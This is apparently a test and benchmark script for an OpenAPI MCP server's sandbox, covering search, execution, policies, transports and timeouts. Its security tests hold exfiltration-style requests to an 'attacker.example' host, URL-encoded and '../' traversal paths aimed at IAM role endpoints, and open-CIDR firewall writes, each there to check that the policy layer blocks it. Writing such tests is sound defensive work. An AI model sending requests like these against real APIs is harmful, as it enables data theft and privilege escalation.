import fs from "node:fs/promises";
import http from "node:http";
import path from "node:path";
import os from "node:os";
import { CodeModeMcpServer, API_PRESETS, loadOpenApiSpec, parseCliArgs } from "./server.ts";
import { indexOpenApiSpec, loadPolicyConfig, buildAuditPolicies, executeCodeMode, searchSpec, normalizeApiPath, type OpenApiOperation, type OpenApiSpec } from "./index.ts";

/**
 * Generates a realistic multi-service Cloud Infrastructure OpenAPI v3 specification
 * (Zones, DNS, Firewall, Workers, R2, Zero Trust, Certificates, Load Balancers, WAF, Logs)
 * with 500 endpoints to benchmark Native MCP vs. Code Mode MCP.
 */
function generateLargeCloudOpenApiSpec(totalOperations = 500): OpenApiSpec {
  const services = [
    "zones",
    "dns_records",
    "firewall_rules",
    "workers_scripts",
    "r2_buckets",
    "d1_databases",
    "zero_trust_policies",
    "ssl_certificates",
    "load_balancers",
    "waf_packages",
  ];
  const methods = ["get", "post", "put", "patch", "delete"] as const;
  const paths: Record<string, Record<string, OpenApiOperation>> = {};

  for (let i = 0; i < totalOperations / methods.length; i++) {
    const service = services[i % services.length];
    const pathKey = `/accounts/{account_id}/${service}/resource_${i}`;
    paths[pathKey] = {};

    for (const method of methods) {
      paths[pathKey][method] = {
        operationId: `${method}_${service}_${i}`,
        summary: `${method.toUpperCase()} ${service.replace("_", " ")} resource #${i}`,
        description: `Manages ${service} configuration, security compliance, and routing policies for enterprise infrastructure resource ${i}.`,
        tags: [service, "infrastructure", "security"],
        parameters: [
          { name: "account_id", in: "path", required: true, schema: { type: "string" } },
          { name: "page", in: "query", required: false, schema: { type: "integer" } },
          { name: "per_page", in: "query", required: false, schema: { type: "integer" } },
        ],
        requestBody:
          method === "post" || method === "put" || method === "patch"
            ? {
                content: {
                  "application/json": {
                    schema: {
                      type: "object",
                      properties: {
                        name: { type: "string" },
                        enabled: { type: "boolean" },
                        cidr: { type: "string" },
                        proxied: { type: "boolean" },
                      },
                    },
                  },
                },
              }
            : undefined,
      };
    }
  }

  return {
    openapi: "3.1.0",
    info: {
      title: "Cloud Infrastructure API",
      version: "4.0.0",
    },
    servers: [{ url: "https://api.cloudflare.com/client/v4" }],
    paths,
  };
}

function estimateTokens(obj: unknown): number {
  const text = JSON.stringify(obj);
  return Math.ceil(text.length / 4);
}

async function runProofOfConcept() {
  console.log("==================================================================");
  console.log("  OPENAPI-CODEMODE-MCP: FINAL PRODUCT BENCHMARK & POLICY SUITE");
  console.log("==================================================================\n");

  const spec = generateLargeCloudOpenApiSpec(500);
  const allEndpoints = indexOpenApiSpec(spec);
  const policies = await loadPolicyConfig("./policies.json");

  // 1. Token Footprint Comparison
  const nativeMcpTools = allEndpoints.map((ep) => ({
    name: ep.operationId,
    description: `${ep.summary} - ${ep.description}`,
    inputSchema: {
      type: "object",
      properties: {
        parameters: ep.parameters,
        requestBody: ep.requestBody,
      },
    },
  }));

  const server = new CodeModeMcpServer({ spec, policies, dryRun: true });
  const codeModeTools = server.getTools();

  const nativeTokens = estimateTokens(nativeMcpTools);
  const codeModeTokens = estimateTokens(codeModeTools);
  const reductionPct = (((nativeTokens - codeModeTokens) / nativeTokens) * 100).toFixed(2);

  console.log("[1] CONTEXT WINDOW BENCHMARK (500 API Endpoints)");
  console.log(`    - Native MCP Tool Definitions : ${nativeMcpTools.length} tools (~${nativeTokens.toLocaleString()} tokens)`);
  console.log(`    - Code Mode MCP Definitions   : ${codeModeTools.length} tools   (~${codeModeTokens.toLocaleString()} tokens)`);
  console.log(`    - Token Savings               : ${reductionPct}% reduction!\n`);

  // 2. Test Tool 1: `search`
  console.log("[2] TESTING TOOL 1: `search({ query: 'firewall_rules', method: 'POST' })`");
  const searchRes = await server.handleToolCall("search", {
    query: "firewall_rules",
    method: "POST",
  });
  const parsedSearch = JSON.parse(searchRes.content[0].text);
  console.log(`    - Indexed Endpoints : ${parsedSearch.totalIndexedEndpoints}`);
  console.log(`    - Returned Matches  : ${parsedSearch.matchCount} (capped at 15)`);
  console.log(`    - First Match       : ${parsedSearch.endpoints[0].method} ${parsedSearch.endpoints[0].path}\n`);

  // 3. Test Tool 2: `execute` (Multi-step Chained Audit in 1 Turn)
  console.log("[3] TESTING TOOL 2: `execute` (Single-Turn Chained Infrastructure Audit)");
  const auditScript = `
    const zones = await api.request("GET", "/accounts/acc_123/zones/resource_0");
    const dns = await api.request("GET", "/accounts/acc_123/dns_records/resource_1");
    const remediation = await api.request("POST", "/accounts/acc_123/firewall_rules/resource_2", {
      name: "block-bad-actors",
      cidr: "192.0.2.0/24",
      origin: "https://secure.example.com",
      enabled: true
    });
    return {
      auditedResources: 2,
      remediationApplied: remediation.path,
      status: "COMPLIANT"
    };
  `;
  const execRes = await server.handleToolCall("execute", { code: auditScript });
  console.log("    - Sandbox Output:");
  console.log("     ", execRes.content[0].text.replace(/\n/g, "\n      "), "\n");

  // 4. Test Upgraded Enterprise Security Policy Suite
  console.log("[4] TESTING ENTERPRISE POLICY SUITE (Loaded from policies.json)");

  const policyTests = [
    {
      label: "Destructive DELETE Attempt",
      code: `return await api.request("DELETE", "/accounts/acc_123/dns_records/resource_1");`,
    },
    {
      label: "Open IPv4 0.0.0.0/0 CIDR",
      code: `return await api.request("POST", "/accounts/acc_123/firewall_rules/resource_2", { cidr: "0.0.0.0/0" });`,
    },
    {
      label: "Open IPv6 ::/0 CIDR",
      code: `return await api.request("POST", "/accounts/acc_123/firewall_rules/resource_2", { cidr: "::/0" });`,
    },
    {
      label: "Protected /iam Path Write",
      code: `return await api.request("PUT", "/accounts/acc_123/iam/roles", { role: "super_admin" });`,
    },
    {
      label: "Insecure http:// Origin",
      code: `return await api.request("POST", "/accounts/acc_123/load_balancers/resource_8", { origin: "http://unencrypted.internal.corp" });`,
    },
  ];

  for (const t of policyTests) {
    const attempt = await server.handleToolCall("execute", { code: t.code });
    console.log(`    - [${attempt.isError ? "BLOCKED" : "ALLOWED"}] ${t.label.padEnd(26)} -> ${JSON.parse(attempt.content[0].text).error}`);
  }

  // 5. Test CLI API Presets (Cloudflare, GitHub, Stripe, Kubernetes, OpenAI, Slack, DigitalOcean)
  console.log("\n[5] TESTING CLI API PRESETS (API_PRESETS Export & CLI flag parsing)");
  const requiredPresets = [
    "cloudflare",
    "github",
    "stripe",
    "kubernetes",
    "openai",
    "slack",
    "digitalocean",
  ] as const;
  for (const presetKey of requiredPresets) {
    const preset = API_PRESETS[presetKey];
    if (!preset) {
      throw new Error(`Preset "${presetKey}" is missing from API_PRESETS`);
    }
    if (!preset.spec || !preset.spec.startsWith("https://")) {
      throw new Error(`Preset "${presetKey}" has invalid spec URL: ${preset.spec}`);
    }
    if (!preset.baseUrl || !preset.baseUrl.startsWith("https://")) {
      throw new Error(`Preset "${presetKey}" has invalid baseUrl: ${preset.baseUrl}`);
    }
    console.log(
      `    - [VERIFIED] Preset '${presetKey.padEnd(10)}' -> ${preset.name} (${preset.baseUrl})`
    );
  }

  const { parseCliArgs } = await import("./server.ts");
  const parsedLong = parseCliArgs(["--preset", "github"]);
  const parsedShort = parseCliArgs(["-P", "stripe"]);
  const parsedTimeout = parseCliArgs(["--timeout-ms", "1500"]);
  if (parsedLong.preset !== "github" || parsedShort.preset !== "stripe") {
    throw new Error(`CLI argument parsing failed for --preset or -P flags`);
  }
  if (parsedTimeout.timeoutMs !== 1500) {
    throw new Error(`CLI argument parsing failed for --timeout-ms flag`);
  }
  console.log("    - [VERIFIED] CLI flags --preset and -P parsed correctly");
  console.log("    - [VERIFIED] CLI flag --timeout-ms parsed correctly");

  // 6. Test Sandbox VM Timeout Enforcement
  console.log("\n[6] TESTING SANDBOX EXECUTION TIMEOUT ENFORCEMENT");
  const timeoutServer = new CodeModeMcpServer({
    spec,
    policies,
    dryRun: true,
    timeoutMs: 150,
  });
  const timeoutRes = await timeoutServer.handleToolCall("execute", {
    code: `while (true) {}`,
  });
  if (!timeoutRes.isError) {
    throw new Error("Expected infinite loop execution to be terminated by timeout, but it succeeded");
  }
  const timeoutErrText = JSON.parse(timeoutRes.content[0].text).error;
  if (!timeoutErrText.includes("timed out")) {
    throw new Error(`Expected timeout error message, got: ${timeoutErrText}`);
  }
  console.log(`    - [VERIFIED] Configured VM execution timeout enforced (${timeoutErrText})`);

  // 7. Test YAML OpenAPI Specification Loading (.yaml and .yml)
  console.log("\n[7] TESTING YAML OPENAPI SPECIFICATION LOADING");
  const sampleYamlSpec = `
openapi: 3.0.0
info:
  title: Kubernetes Sample API
  version: 1.28.0
paths:
  /api/v1/namespaces/{namespace}/pods:
    get:
      operationId: listNamespacedPod
      summary: list or watch objects of kind Pod
      tags:
        - core
      responses:
        '200':
          description: OK
    post:
      operationId: createNamespacedPod
      summary: create a Pod
      tags:
        - core
      responses:
        '201':
          description: Created
`;

  const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "codemode-yaml-test-"));
  const tmpYamlFile = path.join(tmpDir, "k8s-spec.yaml");
  const tmpYmlFile = path.join(tmpDir, "stripe-spec.yml");
  try {
    await fs.writeFile(tmpYamlFile, sampleYamlSpec, "utf8");
    await fs.writeFile(tmpYmlFile, sampleYamlSpec, "utf8");

    const loadedYaml = await loadOpenApiSpec(tmpYamlFile);
    const loadedYml = await loadOpenApiSpec(tmpYmlFile);

    if (loadedYaml.info?.title !== "Kubernetes Sample API") {
      throw new Error(`YAML spec loading failed: unexpected title "${loadedYaml.info?.title}"`);
    }
    if (loadedYml.info?.title !== "Kubernetes Sample API") {
      throw new Error(`.yml spec loading failed: unexpected title "${loadedYml.info?.title}"`);
    }

    const yamlEndpoints = indexOpenApiSpec(loadedYaml);
    if (yamlEndpoints.length !== 2) {
      throw new Error(`Expected 2 indexed endpoints from YAML spec, got ${yamlEndpoints.length}`);
    }

    const yamlServer = new CodeModeMcpServer({ spec: loadedYaml, dryRun: true });
    const searchResult = await yamlServer.handleToolCall("search", { query: "pod" });
    const parsedYamlSearch = JSON.parse(searchResult.content[0].text);
    if (parsedYamlSearch.matchCount !== 2) {
      throw new Error(`Expected 2 matches from YAML server search, got ${parsedYamlSearch.matchCount}`);
    }

    console.log("    - [VERIFIED] .yaml and .yml OpenAPI v3 specs parsed successfully");
    console.log(`    - [VERIFIED] Indexed ${yamlEndpoints.length} endpoints from YAML specification`);
    console.log(`    - [VERIFIED] CodeModeMcpServer search query returned ${parsedYamlSearch.matchCount} matched endpoints`);
  } finally {
    await fs.rm(tmpDir, { recursive: true, force: true });
  }

  // 8. Test Swagger 2.0 Compatibility (schemes + host + basePath resolution)
  console.log("\n[8] TESTING SWAGGER 2.0 COMPATIBILITY (host + basePath resolution)");
  const swagger2Spec: OpenApiSpec = {
    swagger: "2.0",
    info: {
      title: "Petstore Swagger 2.0 API",
      version: "1.0.0",
      description: "Legacy Swagger 2.0 specification for testing",
    },
    host: "petstore.swagger.io",
    basePath: "/v2",
    schemes: ["https"],
    paths: {
      "/pet/{petId}": {
        get: {
          operationId: "getPetById",
          summary: "Find pet by ID",
          description: "Returns a single pet",
          tags: ["pet"],
          parameters: [
            {
              name: "petId",
              in: "path",
              required: true,
              type: "integer",
            },
          ],
        },
        delete: {
          operationId: "deletePet",
          summary: "Deletes a pet",
          description: "Deletes a pet by ID",
          tags: ["pet"],
        },
      },
      "/pet": {
        post: {
          operationId: "addPet",
          summary: "Add a new pet to the store",
          tags: ["pet"],
        },
      },
    },
  };

  const swaggerEndpoints = indexOpenApiSpec(swagger2Spec);
  if (swaggerEndpoints.length !== 3) {
    throw new Error(`Expected 3 indexed endpoints from Swagger 2.0 spec, found ${swaggerEndpoints.length}`);
  }
  console.log(`    - [VERIFIED] Indexed ${swaggerEndpoints.length} endpoints from Swagger 2.0 spec`);

  const swaggerServer = new CodeModeMcpServer({
    spec: swagger2Spec,
    policies,
    dryRun: true,
  });

  const swaggerSearchRes = await swaggerServer.handleToolCall("search", {
    query: "getPetById",
  });
  const parsedSwaggerSearch = JSON.parse(swaggerSearchRes.content[0].text);
  if (parsedSwaggerSearch.matchCount < 1 || parsedSwaggerSearch.endpoints[0].operationId !== "getPetById") {
    throw new Error(`Failed to find getPetById endpoint in Swagger 2.0 spec`);
  }
  console.log("    - [VERIFIED] Search on Swagger 2.0 endpoints succeeded");

  const swaggerExecRes = await swaggerServer.handleToolCall("execute", {
    code: `return await api.request("GET", "/pet/123");`,
  });
  const parsedSwaggerExec = JSON.parse(swaggerExecRes.content[0].text);
  if (parsedSwaggerExec.result?.dryRun !== true || parsedSwaggerExec.result?.path !== "/pet/123") {
    throw new Error(`Execution failed on Swagger 2.0 server: ${JSON.stringify(parsedSwaggerExec)}`);
  }
  console.log("    - [VERIFIED] Base URL derived from Swagger 2.0 (https://petstore.swagger.io/v2)");

  // 9. Test maxResponseBytes Truncation Guardrail
  console.log("\n[9] TESTING MAX RESPONSE BYTES TRUNCATION GUARDRAIL");
  const oversizedScript = `
    const largeArray = new Array(1000).fill("A".repeat(100));
    return { data: largeArray };
  `;
  const defaultTruncRes = await server.handleToolCall("execute", { code: oversizedScript });
  const parsedTruncated = JSON.parse(defaultTruncRes.content[0].text);
  if (!parsedTruncated.truncated) {
    throw new Error(`Expected oversized response to be truncated, but truncated was false`);
  }
  if (typeof parsedTruncated.result !== "string") {
    throw new Error(`Expected truncated result to be string`);
  }
  if (Buffer.byteLength(parsedTruncated.result, "utf8") > 32768) {
    throw new Error(`Truncated result exceeded maxResponseBytes (32768)`);
  }
  console.log(
    `    - [VERIFIED] Oversized payload (${parsedTruncated.originalBytes} bytes) truncated to ${Buffer.byteLength(parsedTruncated.result, "utf8")} bytes (truncated: true)`
  );

  const customTruncOutcome = await executeCodeMode(
    `return { message: "x".repeat(500) };`,
    {
      baseUrl: "https://api.example.com",
      maxResponseBytes: 128,
    }
  );
  if (!customTruncOutcome.truncated) {
    throw new Error(`Expected custom maxResponseBytes output to be truncated`);
  }
  if (Buffer.byteLength(customTruncOutcome.result as string, "utf8") > 128) {
    throw new Error(`Custom truncated output exceeded maxResponseBytes (128)`);
  }
  console.log(
    `    - [VERIFIED] Custom maxResponseBytes limit (128 bytes) enforced (truncated: true)`
  );

  const normalOutcome = await executeCodeMode(
    `return { message: "hello world" };`,
    {
      baseUrl: "https://api.example.com",
      maxResponseBytes: 32768,
    }
  );
  if (normalOutcome.truncated) {
    throw new Error(`Expected normal payload to not be truncated`);
  }
  console.log(`    - [VERIFIED] Normal payload remains untruncated (truncated: false)`);

  // 10. Test Built-in api.paginate() Helper
  console.log("\n[10] TESTING BUILT-IN API.PAGINATE() SANDBOX HELPER");
  const paginateScript = `
    const pages = await api.paginate("GET", "/accounts/acc_123/zones/resource_0", {
      maxPages: 3,
      limit: 10,
    });
    return pages;
  `;
  const paginateRes = await server.handleToolCall("execute", { code: paginateScript });
  const parsedPaginate = JSON.parse(paginateRes.content[0].text);
  if (!parsedPaginate.result || typeof parsedPaginate.result !== "object") {
    throw new Error(`Expected paginate result object, got: ${JSON.stringify(parsedPaginate)}`);
  }
  if (parsedPaginate.result.pagesFetched !== 3) {
    throw new Error(`Expected 3 pages fetched, got ${parsedPaginate.result.pagesFetched}`);
  }
  if (!Array.isArray(parsedPaginate.result.items) || parsedPaginate.result.items.length !== 3) {
    throw new Error(`Expected 3 accumulated page items, got ${parsedPaginate.result.items.length}`);
  }
  console.log(
    `    - [VERIFIED] api.paginate() successfully traversed ${parsedPaginate.result.pagesFetched} pages (${parsedPaginate.result.totalItems} total items collected)`
  );

  // 11. Test OpenAPI $ref + Circular $ref Schema Resolution, TypeScript typeHints & Relevance Search
  console.log("\n[11] TESTING OPENAPI $REF RESOLUTION, TS TYPE HINTS & RELEVANCE SEARCH");
  const refSpec: OpenApiSpec = {
    openapi: "3.0.3",
    info: { title: "Ref Test API", version: "1.0.0" },
    components: {
      schemas: {
        CreateItemInput: {
          type: "object",
          required: ["name"],
          properties: {
            name: { type: "string" },
            tags: { type: "array", items: { type: "string" } },
            parent: { $ref: "#/components/schemas/Node" },
          },
        },
        Node: {
          type: "object",
          required: ["id"],
          properties: {
            id: { type: "string" },
            next: { $ref: "#/components/schemas/Node" },
          },
        },
      },
    },
    paths: {
      "/items": {
        get: {
          operationId: "listItems",
          summary: "List items",
          responses: {
            "200": {
              description: "OK",
              content: {
                "application/json": {
                  schema: { type: "array", items: { $ref: "#/components/schemas/Node" } },
                },
              },
            },
          },
        },
        post: {
          operationId: "createItem",
          summary: "Create item",
          parameters: [{ name: "page", in: "query", required: false, schema: { type: "number" } }],
          requestBody: {
            content: {
              "application/json": {
                schema: { $ref: "#/components/schemas/CreateItemInput" },
              },
            },
          },
          responses: {
            "201": {
              description: "Created",
              content: {
                "application/json": {
                  schema: { $ref: "#/components/schemas/Node" },
                },
              },
            },
          },
        },
      },
      "/status": {
        get: {
          operationId: "getStatus",
          summary: "Inspect items subsystem health",
          responses: { "200": { description: "OK" } },
        },
      },
    },
  };

  const refEndpoints = indexOpenApiSpec(refSpec);
  const postItemResults = searchSpec(refEndpoints, "items", "POST");
  if (postItemResults.length !== 1) {
    throw new Error(`Expected 1 POST /items endpoint, got ${postItemResults.length}`);
  }
  const hints = postItemResults[0].typeHints;
  if (
    !hints?.parameters?.includes("page?: number") ||
    !hints?.requestBody?.includes("name: string") ||
    !hints?.requestBody?.includes("tags?: string[]") ||
    !hints?.response?.includes("next?: Node")
  ) {
    throw new Error(`Unexpected resolved typeHints: ${JSON.stringify(hints)}`);
  }
  const rankedItems = searchSpec(refEndpoints, "items");
  if (rankedItems.length < 3 || rankedItems[0].path !== "/items") {
    throw new Error(`Expected /items to outrank summary-only match, got ${rankedItems[0]?.path}`);
  }
  const slimSearch = searchSpec(refEndpoints, "items", "POST", { includeTypes: false });
  if (slimSearch.length !== 1 || slimSearch[0].typeHints !== undefined) {
    throw new Error("Expected includeTypes: false to omit typeHints");
  }
  console.log("    - [VERIFIED] $ref & circular $ref resolution produced compact TS typeHints and ranked search results");

  // 12. Test Security Hardening, Async Abort Timeout, 204/503 Retry & Cursor Pagination Edge Cases
  console.log("\n[12] TESTING SECURITY HARDENING, ASYNC ABORT TIMEOUT, 204/RETRY & CURSOR PAGINATION");
  const auditPolicies = buildAuditPolicies();
  const hardeningDryRun = await executeCodeMode(
    `
      const verdicts = {};
      try {
        await api.request("POST", "/IAM/users", { role: "admin" });
      } catch (err) {
        verdicts.iamBlocked = String(err && err.message ? err.message : err);
      }
      try {
        await api.request("POST", "/webhooks", {
          safe: "http://localhost:8080",
          evil: "http://attacker.example/hook"
        });
      } catch (err) {
        verdicts.httpBlocked = String(err && err.message ? err.message : err);
      }
      verdicts.allowed = await api.request("GET", "/zones");
      return verdicts;
    `,
    {
      baseUrl: "https://example.invalid",
      policies: auditPolicies,
      dryRun: true,
    }
  );
  const hardeningResult = hardeningDryRun.result as Record<string, unknown>;
  if (
    typeof hardeningResult.iamBlocked !== "string" ||
    !hardeningResult.iamBlocked.includes("protect-sensitive-account-paths")
  ) {
    throw new Error(`Expected case-insensitive /IAM block, got: ${JSON.stringify(hardeningResult)}`);
  }
  if (
    typeof hardeningResult.httpBlocked !== "string" ||
    !hardeningResult.httpBlocked.includes("block-insecure-http-origins")
  ) {
    throw new Error(`Expected http:// smuggling block, got: ${JSON.stringify(hardeningResult)}`);
  }
  if (
    hardeningDryRun.dryRunSummary?.totalCalls !== 3 ||
    hardeningDryRun.dryRunSummary?.allowedCalls !== 1 ||
    hardeningDryRun.dryRunSummary?.blockedCalls !== 2
  ) {
    throw new Error(`Unexpected dryRunSummary: ${JSON.stringify(hardeningDryRun.dryRunSummary)}`);
  }
  console.log("    - [VERIFIED] Case-insensitive protected path check, HTTP smuggling fix, and dryRunSummary counters");

  let flakyAttempts = 0;
  const pendingTimers = new Set<ReturnType<typeof setTimeout>>();
  const edgeServer = http.createServer((req, res) => {
    const reqUrl = new URL(req.url ?? "/", "http://127.0.0.1");
    if (reqUrl.pathname === "/slow") {
      const timer = setTimeout(() => {
        pendingTimers.delete(timer);
        if (!res.writableEnded) {
          res.writeHead(200, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ slow: true }));
        }
      }, 400);
      pendingTimers.add(timer);
      req.on("close", () => {
        clearTimeout(timer);
        pendingTimers.delete(timer);
      });
      return;
    }
    if (reqUrl.pathname === "/empty") {
      res.writeHead(204);
      res.end();
      return;
    }
    if (reqUrl.pathname === "/flaky") {
      flakyAttempts++;
      if (flakyAttempts === 1) {
        res.writeHead(503, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: "temporary overload" }));
        return;
      }
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ recovered: true, attempt: flakyAttempts }));
      return;
    }
    if (reqUrl.pathname === "/cursor-pages") {
      const cursor = reqUrl.searchParams.get("cursor");
      if (!cursor) {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ result: [{ id: 1 }, { id: 2 }], result_info: { next_cursor: "c2" } }));
      } else {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ result: [{ id: 3 }], result_info: {} }));
      }
      return;
    }
    res.writeHead(404);
    res.end();
  });

  await new Promise<void>((resolve) => edgeServer.listen(0, "127.0.0.1", () => resolve()));
  const edgeAddr = edgeServer.address();
  const edgePort = typeof edgeAddr === "object" && edgeAddr ? edgeAddr.port : 0;
  const edgeBaseUrl = `http://127.0.0.1:${edgePort}`;

  try {
    let timedOut = false;
    try {
      await executeCodeMode(`return await api.request("GET", "/slow");`, {
        baseUrl: edgeBaseUrl,
        policies: auditPolicies,
        timeoutMs: 60,
      });
    } catch (timeoutErr) {
      const msg = timeoutErr instanceof Error ? timeoutErr.message : String(timeoutErr);
      if (msg.includes("timed out after 60ms")) {
        timedOut = true;
      } else {
        throw timeoutErr;
      }
    }
    if (!timedOut) {
      throw new Error("Expected async slow fetch to abort and time out after 60ms");
    }

    const edgeExec = await executeCodeMode(
      `
        const emptyRes = await api.request("POST", "/empty", { ping: true });
        const flakyRes = await api.request("GET", "/flaky", undefined, { retries: 2, retryDelayMs: 15 });
        const onePage = await api.paginate("GET", "/cursor-pages", { limit: 2, maxPages: 1 });
        const allPages = await api.paginate("GET", "/cursor-pages", { limit: 2, maxPages: 5 });
        return { emptyRes, flakyRes, onePage, allPages };
      `,
      {
        baseUrl: edgeBaseUrl,
        policies: auditPolicies,
        timeoutMs: 3000,
      }
    );
    const edgeData = edgeExec.result as {
      emptyRes: unknown;
      flakyRes: { recovered: boolean; attempt: number };
      onePage: { pagesFetched: number; totalItems: number };
      allPages: { pagesFetched: number; totalItems: number };
    };
    if (edgeData.emptyRes !== null) {
      throw new Error(`Expected 204 No Content to return null, got: ${JSON.stringify(edgeData.emptyRes)}`);
    }
    if (!edgeData.flakyRes?.recovered || edgeData.flakyRes.attempt !== 2) {
      throw new Error(`Expected 503 auto-retry to succeed on attempt 2, got: ${JSON.stringify(edgeData.flakyRes)}`);
    }
    if (edgeData.onePage.pagesFetched !== 1 || edgeData.onePage.totalItems !== 2) {
      throw new Error(`Expected 1 page / 2 items for maxPages=1, got: ${JSON.stringify(edgeData.onePage)}`);
    }
    if (edgeData.allPages.pagesFetched !== 2 || edgeData.allPages.totalItems !== 3) {
      throw new Error(`Expected 2 pages / 3 items across cursor pagination, got: ${JSON.stringify(edgeData.allPages)}`);
    }
    console.log("    - [VERIFIED] Async AbortController timeout, 204 null body, 503 auto-retry, and exact cursor pagesFetched");
  } finally {
    for (const timer of pendingTimers) {
      clearTimeout(timer);
    }
    pendingTimers.clear();
    edgeServer.closeAllConnections?.();
    await new Promise<void>((resolve) => edgeServer.close(() => resolve()));
  }

  // 13. Test CLI Flags & Zero-Dependency HTTP + SSE MCP Transport
  console.log("\n[13] TESTING CLI FLAGS & HTTP / SSE MCP TRANSPORT");
  const parsedFlags = parseCliArgs(["--transport", "sse", "--port", "4010", "--timeout-ms", "2500", "--dry-run"]);
  if (
    parsedFlags.transport !== "sse" ||
    parsedFlags.port !== 4010 ||
    parsedFlags.timeoutMs !== 2500 ||
    parsedFlags.dryRun !== true
  ) {
    throw new Error(`Unexpected parseCliArgs output: ${JSON.stringify(parsedFlags)}`);
  }

  const httpMcpServer = new CodeModeMcpServer({
    spec: refSpec,
    baseUrl: "https://example.invalid",
    dryRun: true,
    policies: auditPolicies,
  });
  const startedHttp = await httpMcpServer.startHttp({ port: 0, host: "127.0.0.1" });
  try {
    const healthRes = await fetch(`${startedHttp.url}/health`);
    const healthJson = (await healthRes.json()) as {
      status: string;
      endpointsIndexed: number;
      tools: string[];
      metrics?: { endpointsIndexed: number };
    };
    if (
      healthRes.status !== 200 ||
      healthJson.status !== "ok" ||
      healthJson.endpointsIndexed !== 3 ||
      healthJson.tools.length !== 2 ||
      healthJson.metrics?.endpointsIndexed !== 3
    ) {
      throw new Error(`Unexpected /health response: ${JSON.stringify(healthJson)}`);
    }

    const metricsRes = await fetch(`${startedHttp.url}/metrics`);
    const metricsJson = (await metricsRes.json()) as { endpointsIndexed: number };
    if (metricsRes.status !== 200 || metricsJson.endpointsIndexed !== 3) {
      throw new Error(`Unexpected /metrics response: ${JSON.stringify(metricsJson)}`);
    }

    const oversizedPayload = JSON.stringify({
      jsonrpc: "2.0",
      id: 99,
      method: "tools/list",
      padding: "x".repeat(1024 * 1024 + 512),
    });
    const oversizedRes = await fetch(`${startedHttp.url}/mcp`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: oversizedPayload,
    });
    if (oversizedRes.status !== 413) {
      throw new Error(`Expected 413 Payload Too Large for >1MB body, got ${oversizedRes.status}`);
    }

    const mcpCallRes = await fetch(`${startedHttp.url}/mcp`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 2,
        method: "tools/call",
        params: { name: "search", arguments: { query: "items", method: "POST" } },
      }),
    });
    const mcpCallJson = (await mcpCallRes.json()) as {
      result?: { content?: Array<{ text: string }> };
    };
    const searchPayload = JSON.parse(mcpCallJson.result?.content?.[0]?.text ?? "{}") as {
      matchCount: number;
      endpoints: Array<{ typeHints?: { requestBody?: string } }>;
    };
    if (
      mcpCallRes.status !== 200 ||
      searchPayload.matchCount !== 1 ||
      !searchPayload.endpoints[0]?.typeHints?.requestBody?.includes("name: string")
    ) {
      throw new Error(`Unexpected POST /mcp search response: ${JSON.stringify(mcpCallJson)}`);
    }

    const sseAbort = new AbortController();
    const sseRes = await fetch(`${startedHttp.url}/sse`, { signal: sseAbort.signal });
    const reader = sseRes.body?.getReader();
    if (!sseRes.ok || !reader) {
      throw new Error(`Failed to open GET /sse stream: status ${sseRes.status}`);
    }
    const decoder = new TextDecoder();
    let sseBuffer = "";
    const readUntil = async (marker: string) => {
      const startedWait = Date.now();
      while (!sseBuffer.includes(marker)) {
        if (Date.now() - startedWait > 3000) {
          throw new Error(`Timed out waiting for SSE marker '${marker}' in buffer: ${sseBuffer}`);
        }
        const chunk = await reader.read();
        if (chunk.done) break;
        sseBuffer += decoder.decode(chunk.value, { stream: true });
      }
    };

    try {
      await readUntil("event: endpoint\n");
      const endpointMatch = sseBuffer.match(/data:\s*(\/messages\?sessionId=[^\s]+)/);
      if (!endpointMatch) {
        throw new Error(`Missing SSE endpoint session path in: ${sseBuffer}`);
      }
      const msgRes = await fetch(`${startedHttp.url}${endpointMatch[1]}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 9, method: "tools/list" }),
      });
      if (msgRes.status !== 202) {
        throw new Error(`Expected 202 Accepted from POST /messages, got ${msgRes.status}`);
      }
      await readUntil('"id":9');
      if (!sseBuffer.includes('"search"') || !sseBuffer.includes('"execute"')) {
        throw new Error(`Expected tools/list response on SSE stream, got: ${sseBuffer}`);
      }
    } finally {
      await reader.cancel().catch(() => {});
      sseAbort.abort();
    }
    console.log("    - [VERIFIED] CLI flags, GET /health, POST /mcp, and GET /sse + POST /messages round-trip");
  } finally {
    await startedHttp.close();
  }

  // 14. Test SSRF Origin Guard, Traversal Normalization, YAML $ref/Server Variables, Path Params & JSON-RPC Ping/Errors
  console.log("\n[14] TESTING SSRF ORIGIN GUARD, TRAVERSAL NORMALIZATION, YAML $REF & JSON-RPC HARDENING");
  const canonicalPath = normalizeApiPath("/accounts/123/zones/../%69%61%6d/roles");
  if (canonicalPath !== "/accounts/123/iam/roles") {
    throw new Error(`Expected normalized path '/accounts/123/iam/roles', got '${canonicalPath}'`);
  }

  const ssrfAndTraversalDryRun = await executeCodeMode(
    `
      const checks = {};
      for (const [key, method, target] of [
        ["encodedIam", "POST", "/accounts/123/%69%61%6d/roles"],
        ["traversalIam", "POST", "/accounts/123/zones/../iam/roles"],
        ["httpGet", "GET", "http://attacker.example/exfil"],
        ["crossOrigin", "GET", "https://attacker.example/exfil"]
      ]) {
        try {
          await api.request(method, target);
          checks[key] = "UNEXPECTED_ALLOW";
        } catch (err) {
          checks[key] = String(err && err.message ? err.message : err);
        }
      }
      return checks;
    `,
    {
      baseUrl: "https://api.example.com/v1",
      policies: auditPolicies,
      dryRun: true,
    }
  );
  const secChecks = ssrfAndTraversalDryRun.result as Record<string, string>;
  if (
    !secChecks.encodedIam?.includes("protect-sensitive-account-paths") ||
    !secChecks.traversalIam?.includes("protect-sensitive-account-paths") ||
    !secChecks.httpGet?.includes("block-insecure-http-origins") ||
    !secChecks.crossOrigin?.includes("Blocked cross-origin request")
  ) {
    throw new Error(`Unexpected security hardening check results: ${JSON.stringify(secChecks)}`);
  }

  const hardeningYamlFile = path.join(os.tmpdir(), `codemode-hardening-${Date.now()}.yaml`);
  await fs.writeFile(
    hardeningYamlFile,
    `openapi: "3.0.3"
info:
  title: "YAML Ref & Variables API"
  version: "1.0.0"
servers:
  - url: https://{region}.api.example.com/{version}
    variables:
      region:
        default: us-east
